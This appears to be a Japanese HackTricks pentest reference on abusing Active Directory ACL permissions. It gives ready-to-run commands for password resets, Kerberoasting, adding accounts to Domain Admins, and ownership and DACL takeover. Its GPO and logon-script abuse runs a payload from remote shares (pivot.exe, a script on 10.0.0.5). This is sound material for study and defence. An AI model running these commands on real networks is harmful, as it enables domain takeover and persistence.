# Active Directory ACLs/ACEsの悪用

{{#include ../../../banners/hacktricks-training.md}}

**このページは主に** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **および** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**の技術の要約です。詳細については、元の記事を確認してください。**

## **ユーザーに対するGenericAll権限**

この権限は、攻撃者にターゲットユーザーアカウントに対する完全な制御を与えます。`Get-ObjectAcl`コマンドを使用して`GenericAll`権限が確認されると、攻撃者は次のことができます：

- **ターゲットのパスワードを変更**: `net user <username> <password> /domain`を使用して、攻撃者はユーザーのパスワードをリセットできます。
- **ターゲット化されたKerberoasting**: ユーザーアカウントにSPNを割り当ててkerberoastableにし、次にRubeusとtargetedKerberoast.pyを使用してチケット授与チケット（TGT）ハッシュを抽出し、クラックを試みます。
```powershell
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: ユーザーの事前認証を無効にし、そのアカウントをASREPRoastingに対して脆弱にします。
```powershell
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **GenericAll権限のグループ**

この特権により、攻撃者は`Domain Admins`のようなグループに対して`GenericAll`権限を持っている場合、グループメンバーシップを操作することができます。`Get-NetGroup`を使用してグループの識別名を特定した後、攻撃者は次のことができます：

- **自分をDomain Adminsグループに追加する**：これは、直接コマンドを使用するか、Active DirectoryやPowerSploitのようなモジュールを使用して行うことができます。
```powershell
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
## **GenericAll / GenericWrite / Write on Computer/User**

これらの権限をコンピュータオブジェクトまたはユーザーアカウントで保持することにより、以下が可能になります：

- **Kerberos Resource-based Constrained Delegation**: コンピュータオブジェクトを乗っ取ることを可能にします。
- **Shadow Credentials**: この技術を使用して、シャドウクレデンシャルを作成する権限を悪用することで、コンピュータまたはユーザーアカウントを偽装します。

## **WriteProperty on Group**

ユーザーが特定のグループ（例：`Domain Admins`）のすべてのオブジェクトに対して`WriteProperty`権限を持っている場合、以下が可能です：

- **Add Themselves to the Domain Admins Group**: `net user`と`Add-NetGroupUser`コマンドを組み合わせることで達成可能であり、この方法はドメイン内での権限昇格を可能にします。
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **グループの自己（自己メンバーシップ）**

この特権により、攻撃者は`Domain Admins`などの特定のグループに自分自身を追加することができます。次のコマンドシーケンスを使用すると、自己追加が可能になります：
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (自己メンバーシップ)**

同様の特権であり、攻撃者はグループに対する`WriteProperty`権限を持っている場合、グループのプロパティを変更することで自分自身を直接グループに追加することができます。この特権の確認と実行は次のように行われます:
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

`User-Force-Change-Password`のためにユーザーに対して`ExtendedRight`を保持することで、現在のパスワードを知らなくてもパスワードをリセットできます。この権利の確認とその悪用は、PowerShellや代替のコマンドラインツールを通じて行うことができ、インタラクティブセッションや非インタラクティブ環境向けのワンライナーを含む、ユーザーのパスワードをリセットするためのいくつかの方法を提供します。コマンドは、シンプルなPowerShellの呼び出しからLinux上での`rpcclient`の使用まで多岐にわたり、攻撃ベクトルの多様性を示しています。
```powershell
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **グループのWriteOwner**

攻撃者がグループに対して`WriteOwner`権限を持っていることが判明した場合、彼らはそのグループの所有権を自分自身に変更することができます。これは、問題のグループが`Domain Admins`である場合に特に影響が大きく、所有権を変更することでグループの属性やメンバーシップに対するより広範な制御が可能になります。このプロセスには、`Get-ObjectAcl`を使用して正しいオブジェクトを特定し、その後`Set-DomainObjectOwner`を使用して所有者をSIDまたは名前で変更することが含まれます。
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on User**

この権限により、攻撃者はユーザーのプロパティを変更できます。具体的には、`GenericWrite` アクセスを使用すると、攻撃者はユーザーのログオンスクリプトパスを変更して、ユーザーのログオン時に悪意のあるスクリプトを実行させることができます。これは、`Set-ADObject` コマンドを使用して、ターゲットユーザーの `scriptpath` プロパティを攻撃者のスクリプトを指すように更新することで実現されます。
```powershell
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

この特権を持つ攻撃者は、特定のグループに自分自身や他のユーザーを追加するなど、グループメンバーシップを操作できます。このプロセスには、資格情報オブジェクトを作成し、それを使用してグループからユーザーを追加または削除し、PowerShellコマンドでメンバーシップの変更を確認することが含まれます。
```powershell
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**

ADオブジェクトを所有し、その上で`WriteDACL`権限を持つことは、攻撃者がオブジェクトに対して`GenericAll`権限を付与することを可能にします。これはADSI操作を通じて実現され、オブジェクトに対する完全な制御とそのグループメンバーシップを変更する能力を提供します。それにもかかわらず、Active Directoryモジュールの`Set-Acl` / `Get-Acl` cmdletを使用してこれらの権限を悪用しようとする際には制限があります。
```powershell
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **ドメイン上のレプリケーション (DCSync)**

DCSync攻撃は、ドメイン上の特定のレプリケーション権限を利用して、ドメインコントローラーを模倣し、ユーザーの資格情報を含むデータを同期します。この強力な技術は、`DS-Replication-Get-Changes`のような権限を必要とし、攻撃者がドメインコントローラーへの直接アクセスなしにAD環境から機密情報を抽出することを可能にします。[**DCSync攻撃の詳細はこちら。**](../dcsync.md)

## GPO委任 <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO委任

グループポリシーオブジェクト (GPO) を管理するための委任されたアクセスは、重大なセキュリティリスクをもたらす可能性があります。たとえば、`offense\spotless`のようなユーザーにGPO管理権限が委任されると、**WriteProperty**、**WriteDacl**、および**WriteOwner**のような特権を持つ可能性があります。これらの権限は、PowerViewを使用して特定された悪用のために利用される可能性があります: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### GPO権限の列挙

誤って構成されたGPOを特定するために、PowerSploitのcmdletを連結することができます。これにより、特定のユーザーが管理権限を持つGPOを発見することができます: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**適用されたポリシーを持つコンピュータ**: 特定のGPOが適用されるコンピュータを解決することが可能で、潜在的な影響の範囲を理解するのに役立ちます。 `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**特定のコンピュータに適用されたポリシー**: 特定のコンピュータに適用されているポリシーを確認するには、`Get-DomainGPO`のようなコマンドを利用できます。

**特定のポリシーが適用されたOU**: 特定のポリシーに影響を受ける組織単位 (OU) を特定するには、`Get-DomainOU`を使用できます。

### GPOの悪用 - New-GPOImmediateTask

誤って構成されたGPOは、コードを実行するために悪用される可能性があり、たとえば、即時スケジュールタスクを作成することによって実行できます。これにより、影響を受けたマシンのローカル管理者グループにユーザーを追加し、特権を大幅に昇格させることができます:
```powershell
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy モジュール - GPOの悪用

GroupPolicy モジュールがインストールされている場合、新しい GPO の作成とリンク、影響を受けたコンピュータでバックドアを実行するためのレジストリ値などの設定が可能です。この方法では、GPO を更新し、実行のためにユーザーがコンピュータにログインする必要があります。
```powershell
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - GPOの悪用

SharpGPOAbuseは、既存のGPOを悪用する方法を提供し、新しいGPOを作成することなくタスクを追加したり設定を変更したりします。このツールは、変更を適用する前に既存のGPOを変更するか、RSATツールを使用して新しいGPOを作成する必要があります。
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### 強制ポリシー更新

GPOの更新は通常90分ごとに行われます。このプロセスを迅速化するために、特に変更を実施した後は、ターゲットコンピュータ上で`gpupdate /force`コマンドを使用して即時のポリシー更新を強制することができます。このコマンドは、GPOへの変更が次の自動更新サイクルを待たずに適用されることを保証します。

### 背景

特定のGPO、例えば`Misconfigured Policy`のスケジュールされたタスクを検査すると、`evilTask`のようなタスクの追加が確認できます。これらのタスクは、システムの動作を変更したり、特権を昇格させたりすることを目的としたスクリプトやコマンドラインツールを通じて作成されます。

`New-GPOImmediateTask`によって生成されたXML構成ファイルに示されているタスクの構造は、実行されるコマンドやそのトリガーを含むスケジュールされたタスクの詳細を概説しています。このファイルは、GPO内でスケジュールされたタスクがどのように定義され、管理されるかを示しており、ポリシーの強制の一環として任意のコマンドやスクリプトを実行する方法を提供します。

### ユーザーとグループ

GPOは、ターゲットシステム上のユーザーおよびグループのメンバーシップを操作することも可能です。ユーザーとグループのポリシーファイルを直接編集することで、攻撃者はローカルの`administrators`グループなどの特権グループにユーザーを追加できます。これは、GPO管理権限の委任を通じて可能であり、新しいユーザーを含めたり、グループメンバーシップを変更したりするためのポリシーファイルの修正を許可します。

ユーザーとグループのXML構成ファイルは、これらの変更がどのように実施されるかを概説しています。このファイルにエントリを追加することで、特定のユーザーに影響を受けたシステム全体で昇格された特権を付与することができます。この方法は、GPO操作を通じた特権昇格の直接的なアプローチを提供します。

さらに、ログオン/ログオフスクリプトの活用、オートランのためのレジストリキーの変更、.msiファイルを介したソフトウェアのインストール、サービス構成の編集など、コードを実行したり持続性を維持したりするための追加の方法も考慮できます。これらの技術は、GPOの悪用を通じてターゲットシステムへのアクセスを維持し、制御するためのさまざまな手段を提供します。

## 参考文献

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)

{{#include ../../../banners/hacktricks-training.md}}
